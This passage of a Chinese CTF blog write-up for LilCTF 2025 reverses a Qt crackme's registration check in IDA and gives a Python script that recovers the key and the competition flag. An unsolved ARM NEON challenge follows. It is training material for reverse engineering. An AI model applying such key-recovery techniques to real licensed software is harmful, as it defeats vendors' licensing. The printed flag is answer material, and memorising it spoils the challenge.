+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172359359.png" alt="image-20250816172359359"></p>
+<p>然后尝试去string里面找看看有没有类似提示的</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172226322.png" alt="image-20250816172226322"></p>
+<p>找到了，这个应该就是函数主体了</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172518000.png" alt="image-20250816172518000"></p>
+<p>显而易见逻辑函数就在里面，我们点进去看看</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172551190.png" alt="image-20250816172551190"></p>
+<p>完成对逻辑函数的逆向，生成脚本</p>
+<p>逻辑如下：</p>
+<ul>
+<li>字符索引为偶数，Unicode值加1</li>
+<li>字符索引为奇数，Unicode值减1</li>
+</ul>
+<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">decrypt_key</span>(<span class="params">encrypted_seed</span>):
+    decrypted_chars = []
+    <span class="comment"># 使用 enumerate 同时获取索引 i 和字符 char</span>
+    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_seed):
+        <span class="comment"># 获取字符的Unicode整数值</span>
+        original_unicode = <span class="built_in">ord</span>(char)
+
+        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment"># 索引为偶数</span>
+            new_unicode = original_unicode + <span class="number">1</span>
+        <span class="keyword">else</span>:  <span class="comment"># 索引为奇数</span>
+            new_unicode = original_unicode - <span class="number">1</span>
+        
+        <span class="comment"># 将新的Unicode值转换回字符并添加到列表中</span>
+        decrypted_chars.append(<span class="built_in">chr</span>(new_unicode))
+    
+    <span class="comment"># 将列表中的所有字符连接成最终的字符串</span>
+    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted_chars)
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    encrypted_parts = [
+        <span class="string">&quot;KJKDS&quot;</span>,
+        <span class="string">&quot;GzR6`&quot;</span>,
+        <span class="string">&quot;bsd5s&quot;</span>,
+        <span class="string">&quot;1q`0t&quot;</span>,
+        <span class="string">&quot;^wdsx&quot;</span>,
+        <span class="string">&quot;`b1mw&quot;</span>,
+        <span class="string">&quot;2oh4mu|&quot;</span>
+    ]
+
+    encrypted_seed = <span class="string">&quot;&quot;</span>.join(encrypted_parts)
+
+    correct_registration_key = decrypt_key(encrypted_seed)
+
+    <span class="built_in">print</span>(<span class="string">&quot;--- 注册码解密工具 ---&quot;</span>)
+    <span class="built_in">print</span>(<span class="string">f&quot;原始加密片段: <span class="subst">&#123;encrypted_parts&#125;</span>&quot;</span>)
+    <span class="built_in">print</span>(<span class="string">f&quot;拼接后的密钥种子: <span class="subst">&#123;encrypted_seed&#125;</span>&quot;</span>)
+    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">25</span>)
+    <span class="built_in">print</span>(<span class="string">&quot;解密完成！&quot;</span>)
+    <span class="built_in">print</span>(<span class="string">f&quot;正确的注册码是: <span class="subst">&#123;correct_registration_key&#125;</span>&quot;</span>)</code></pre>
+
+<p>得到flag</p>
+<p><strong>LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}</strong></p>
+<h5 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h5><p>首先用jadx查看源代码</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250815172244322.png" alt="image-20250815172244322"></p>
+<p>然后发现需要去ez_asm_hahaha.so里看一下，导出后用ida打开</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250815172346403.png" alt="image-20250815172346403"></p>
+<p>逆向思路如下:</p>
+<p>base64解码-&gt;逆位运算-&gt;逆向NEON</p>
+<p><strong>没做出来</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.qingchenyou.asia">qingchenyou</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.qingchenyou.asia/CTF-WriteUP/LilCTF_wp/">https://blog.qingchenyou.asia/CTF-WriteUP/LilCTF_wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.qingchenyou.asia" target="_blank">QingChenyou | Luda' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/%E5%A4%B4%E5%83%8F.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/CTF-WriteUP/XYCTF2025_wp/" title="XYCTF2025复现 WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XYCTF2025复现 WriteUp</div></div><div class="info-2"><div class="info-item-1">XYCTF 2025...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/CTF-WriteUP/DASctf_wp/" title="DASCTF WriteUP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-17</div><div class="info-item-2">DASCTF WriteUP</div></div><div class="info-2"><div class="info-item-1">DASCTF2024最后一战 WriteUP队伍名称 Im_@tEa_P0t 排名89 名 解题思路CHECKIN签到题打开题目后给了一个网址https://game.gcsis.cn，根据提示使用dirsearch进行扫描，扫出目录下的robots.txt  访问后得到flag REVERSEtryre 首先用exeinfo看一下有没有壳  发现没壳，用ida打开直接转换成伪代码  然后发现里面有个类似base64表的东西ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+&#x2F;  查看main，发现类似base64操作和xor操作  让GPT生成下代码 def custom_base64_decode(encoded):     decode_table = &quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;     base64_table =...</div></div></div></a><a class="pagination-related" href="/CTF-WriteUP/WuCup_wp/" title="WuCup WriteUP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-01</div><div class="info-item-2">WuCup WriteUP</div></div><div class="info-2"><div class="info-item-1">WuCup WriteUP密码的旋转木马 战绩如下：也是氵到三等奖了(雾  非新生ctf赛事，连着9小时，打下来还是挺累的XD MISCSign直接用赛博厨子就能得到flag 原神启动附件中一个png和一个zip 压缩文件加密了，猜测png中有密码 用stegsolve查看得到zip密码  拿到密码后解压压缩包 得到一个word文档 打开word文档全选字体查看是否有隐藏的，果然有   查找隐藏文字的过程中发现一个图片，上面貌似有东西 使用stegsolve查看后发现是一个类似flag的东西，直接提交发现不行 使用binwalk取出word文档中的压缩包，发现一个加密的压缩包 猜测是该压缩包的密码 打开后还有一个加密文档，猜测这个应该就是flag了 密码就是刚刚隐藏的文字  得到flag 旋转木马(这是预期解？)这是什么题这么ex人 不要多想，直接拼接文件疯狂base64就能出，这题咋想的（难受死我了  得到flag 太极(赛时未解出)提示三错了，如果将提示四与提示三一起看的话这个是解不出的  根据提示四  可以得到tieny 太极生两仪tai ji sheng liang...</div></div></div></a><a class="pagination-related" href="/CTF-WriteUP/XYCTF2025_wp/" title="XYCTF2025复现 WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-10</div><div class="info-item-2">XYCTF2025复现 WriteUp</div></div><div class="info-2"><div class="info-item-1">XYCTF 2025...</div></div></div></a><a class="pagination-related" href="/CTF-WriteUP/ciscn2025_up_wp/" title="ciscn2025UP WriteUP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ciscn2025UP WriteUP</div></div><div class="info-2"><div class="info-item-1">ciscn2025半决赛 WriteUPTeam: Im_@tEa_P0t(半决赛三等奖,题实在是太难了) AWDP爆零了，真难 ISW应急响应题目1我rs用不了，抽风了，没看raw亏死我了 首先连接服务器，使用tcpdump抓包，得到一个.pcap文件 然后使用scp下载下来 使用wireshark打开，找到统计-端点，之后就能发现那个异常ip 192.168.57.203:4948 转md5__小写__(不是哥们你flag{MD5}卡了我半天)然后得到flag 题目2已经知道了55658是通信端口，直接写脚本检测55658等待程序出现 嗯好，到结束了也没出现，临近比赛结束一小时的时候发现是可变端口，攻击机端口不可变 很好白等了，最后也没弄出来 </div></div></div></a><a class="pagination-related" href="/CTF-WriteUP/ciscn2025_wp/" title="ciscn2025 WriteUP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-15</div><div class="info-item-2">ciscn2025 WriteUP</div></div><div class="info-2"><div class="info-item-1">ciscn2025初赛 WriteUPTeam: Im_@tEa_P0t MISCZeroshell-1分析流量包，查询zeroshell的漏洞，可以找到一个rce漏洞  然后里面的referer就是flag   Zeroshell-2通过这个漏洞去找flag就可以了  Zeroshell-3找了黑色的，查了查ip归属地，然后对了？算是蒙的吧   flag{202.115.89.103} Zeroshell-4221.204.15.87 山西太原联通 221.204.14.52 山西太原联通 查最近更新的文件 在&#x2F;tmp里面找文件，用ls...</div></div></div></a><a class="pagination-related" href="/CTF-WriteUP/fic25_wp/" title="FIC25初赛 WriteUP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-27</div><div class="info-item-2">FIC25初赛 WriteUP</div></div><div class="info-2"><div class="info-item-1">FIC25初赛 WriteUPTeam: OOQO 总分: 410 排名: 35 (与 36SkyMirror同分) 正确率: 91.11%  最后慌了第四部分乱交导致正确率炸了，要不然应该是只交错一道的( 网站快照1.请分析检材一，该取证录像文件的 SHA256 值为2753da22fe23cadaadc14fe4c1d5096a153360d9f91097ea376846431f5c1567  2.请分析检材一，远程取证所使用的 OBS 工具版本号为29.1.3  3.请分析检材一，该检材所使用的远程取证的工具名称为A  4.请分析检材一，在该检材中，远程取证过程中校验的北京时间为D  5.请分析检材一，远程取证的网站 IP 地址为172.16.10.200  6. 请分析检材一，在该检材中，远程取证的网站密码为admin123  7. 请分析检材一，在已固定的“订单列表”中发现有一页缺失。请找出缺失页面的具体页码为12 视频里面一共给到13页，猜测缺失数据在前13页 数了数没数错的话就是12 8....</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qingchenyou</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/qingchenyouforcc"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is Qingchenyou's Blog!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LilCTF-2025-WP"><span class="toc-number">1.</span> <span class="toc-text">LilCTF 2025 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">1.0.1.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ez-math"><span class="toc-number">1.0.1.0.1.</span> <span class="toc-text">ez_math</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mid-math"><span class="toc-number">1.0.1.0.2.</span> <span class="toc-text">mid_math</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-number">1.0.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%AF%E8%B0%81%E6%B2%A1%E6%9C%89%E9%98%85%E8%AF%BB%E5%8F%82%E8%B5%9B%E9%A1%BB%E7%9F%A5%EF%BC%9F"><span class="toc-number">1.0.2.0.1.</span> <span class="toc-text">是谁没有阅读参赛须知？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PNG-Master"><span class="toc-number">1.0.2.0.2.</span> <span class="toc-text">PNG Master</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E5%89%8D%E6%94%BE%E5%87%BA%E9%99%84%E4%BB%B6"><span class="toc-number">1.0.2.0.3.</span> <span class="toc-text">提前放出附件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#v%E6%88%9150-R-MB-%E8%B5%9B%E5%90%8E"><span class="toc-number">1.0.2.0.4.</span> <span class="toc-text">v我50(R)MB[赛后]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.0.3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ez-bottle"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">ez_bottle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn"><span class="toc-number">1.0.4.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checkin"><span class="toc-number">1.0.4.0.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#The-Truman-Show"><span class="toc-number">1.0.4.0.2.</span> <span class="toc-text">The Truman Show</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse"><span class="toc-number">1.0.5.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E2%80%99M-no7-A-rO6oT"><span class="toc-number">1.0.5.0.1.</span> <span class="toc-text">1’M no7 A rO6oT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Qt-Creator"><span class="toc-number">1.0.5.0.2.</span> <span class="toc-text">Qt_Creator</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ARM-ASM"><span class="toc-number">1.0.5.0.3.</span> <span class="toc-text">ARM ASM</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CTF-WriteUP/LilCTF_wp/" title="LilCTF2025 WriteUp">LilCTF2025 WriteUp</a><time datetime="2025-08-18T08:28:46.490Z" title="发表于 2025-08-18 16:28:46">2025-08-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CTF-WriteUP/XYCTF2025_wp/" title="XYCTF2025复现 WriteUp">XYCTF2025复现 WriteUp</a><time datetime="2025-06-10T11:54:42.722Z" title="发表于 2025-06-10 19:54:42">2025-06-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CTF-WriteUP/fic25_wp/" title="FIC25初赛 WriteUP">FIC25初赛 WriteUP</a><time datetime="2025-04-27T14:15:51.065Z" title="发表于 2025-04-27 22:15:51">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CTF-WriteUP/ownPra_Forensics/" title="电子取证刷题">电子取证刷题</a><time datetime="2025-04-25T13:44:45.880Z" title="发表于 2025-04-25 21:44:45">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CTF-WriteUP/ownPra_AIPrompt/" title="AI方向题">AI方向题</a><time datetime="2025-04-20T14:19:43.563Z" title="发表于 2025-04-20 22:19:43">2025-04-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By qingchenyou</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="日间和夜间模式切换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/sun_moon.js" async></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/c_c++.jpeg);"> <span class="categoryBar-list-descr">C/C++</span></li><li class="categoryBar-list-item" style="background:url(https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/a0b38dd197fd03101d7822cbf8eb5f8a.png);"> <span class="categoryBar-list-descr">Minecraft_normal</span></li><li class="categoryBar-list-item" style="background:url(https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/2.png);"> <span class="categoryBar-list-descr">CTF_WriteUP</span></li><li class="categoryBar-list-item" style="background:url(https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/Python.png);"> <span class="categoryBar-list-descr">Python</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><!-- hexo injector body_end end --></body></html>
